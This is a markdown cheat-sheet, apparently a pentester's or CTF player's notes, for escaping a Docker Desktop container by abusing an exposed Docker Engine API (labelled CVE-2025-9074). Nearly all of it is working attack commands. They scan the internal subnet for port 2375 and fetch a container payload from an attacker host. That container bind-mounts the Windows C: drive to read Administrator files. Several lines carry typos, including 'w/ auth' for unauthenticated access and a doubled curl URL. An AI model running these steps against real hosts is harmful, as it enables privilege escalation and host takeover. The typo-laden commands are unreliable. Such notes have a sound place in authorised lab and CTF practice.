# Docker tricks

% docker

## docker - docker desktop - privesc - docker engine API abuse & mount C:/root drive - CVE-2025-9074
```
# docker desktop privesc - CVE-2025-9074 - docker engine API abuse, mount C:/root drive

# CVE-2025-9074 : Docker Desktop vuln where locally running linux containers can connect to the Docker Engine API over Docker Desltop's internal subnet w/ auth
# The description explicity mentions the default endpoint : 192.168.65.7:2375.
# The vuln can be exploited **regardless** of ECI (enhanced container isolation) & the `Expose daemon on tcp://lcoalhost:2375 w/ TLS` option

# 1. Begin y fingerprinting with
id
cat /etc/os-release

ip adr # note the ip addr range
cat /etc/hosts # checkout the lines that are related to the localhost

# 2. Find the docker API
# Confirm we are in a container & isnpect the netW env
# Find : which subnet we are in; which addr are reacheable. Look for the gateways, DNS servers & any other hosts we can reach
host name
ip addr

# Docker's API typically listens on port
# - 2375 (no TLS)
# - 2376 (TLS)
# if the API is accessible w/ authentication, create a privliged container & access the host fs

# 3. Check the container gw, usually the first addr on the subnet
# Example :
ip route
  default via 172.18.0.1 dev eth0 
  172.18.0.0/16 dev eth0 proto kernel scope link src 172.18.0.2
  curl http://curl http://172.18.0.1:2375/version

# 4. If 'Could not connect to server' error, the gw is a virtual interface of the bridge netW.
# Try `host.docker.internal`, a special DNS name that Docker Desktop cretes to access the host from inside containers
curl -v http://host.docker.internal:2375/version
  * Host host.docker.internal:2375 was resolved.
  * IPv6: fdc4:f303:9324::254
  * IPv4: 192.168.65.254
  *   Trying 192.168.65.254:2375...
  * connect to 192.168.65.254 port 2375 from 172.18.0.2 port 38548 failed: Connection refused
  curl: (7) Failed to connect to host.docker.internal port 2375 after 19 ms: Could not connect to server

# If `host.docker.internal` resolves to 2 addr : IPv6 ... (unreachable: netW is undreachable) & IPv4 192.168.X.X (Connection refused). That's Docker Desktop's internal subnet on Windows
# The `192.168.XX.0/24` is used by Docker Desktop for communication between the host & containers. The API isn't on `.254` but that doesn't mean it isn't elsewhere on the subnet

# 5. Check if Docker socket is mounted inside the container
ls -al /var/run/docker.sock 2>/dev/null
find / -name "docker.sock" 2>/dev/null

# No socket mounted ?

# 6. Scan 192.138.XX.0/24
# Since `host.docker.internal` points to `192.168.XX.254` bur the API isn't there, the Docker Engine might be listening on another IP in the same subnet.
# Bruteforce all addr on /24
for i in $(seq 1 254); do (curl -s --connect-timeout 1 http://192.168.65.$i:2375/version 2>/dev/null | grep -q "ApiVersion" && echo "192.168.65.$i:2375 OPEN") & done; wait
# Hit : 192.168.XX.7:2375 OPEN

# 7.Confirm the API responds, check the version
curl http://192.168.65.7:2375/version
  {
    "Platform": {"Name": "Docker Engine - Community"},
    "Version": "28.3.2",
    "ApiVersion": "1.51",
    "KernelVersion": "6.6.87.2-microsoft-standard-WSL2",
    "Os": "linux",
    "Arch": "amd64"
  }

# if you get a response, the Docker API is accessible w/ auth > CVE-2025-9074, it allows containers to connect to the Docker Engine API over the internal subnet w/ auth

# 8. List available images
curl -s http://192.168.65.7:2375/images/json | grep -o '"RepoTags":\[[^]]*\]'
  "RepoTags":["docker_setup-nginx-php:latest"]
  "RepoTags":["docker_setup-mariadb:latest"]
  "RepoTags":["alpine:latest"]

# 9. Create a container to mount the host fs
# JSON config to host on our atk machine :
# Key parts:
# - `Binds` mounts the host `C:\` drive into the container
# - `/mnt/host/c` is how Docker Desltop on Windows exposes the host fs via WSL2
# Use the `alpine` image since it's already present
cat > /tmp/container.json << 'EOF'
{
  "Image": "alpine:latest",
  "Cmd": ["/bin/sh", "-c", "cat /mnt/host_root/Users/Administrator/Desktop/root.txt"],
  "HostConfig": {
    "Binds": ["/mnt/host/c:/mnt/host_root"]
  },
  "Tty": true,
  "OpenStdin": true
}
EOF

cd /tmp && python3 -m http.server 8000

# Inside the container, we download the payload, create the container, and start it via the Docker API:
curl http://10.10.14.36:8000/container.json -o /tmp/container.json
curl -X POST -H "Content-Type: application/json" -d @/tmp/container.json http://192.168.65.7:2375/containers/create?name=notevil
curl -X POST http://192.168.65.7:2375/containers/7d99df11ee0f/start
curl http://192.168.65.7:2375/containers/7d99df11ee0f/logs?stdout=true
```
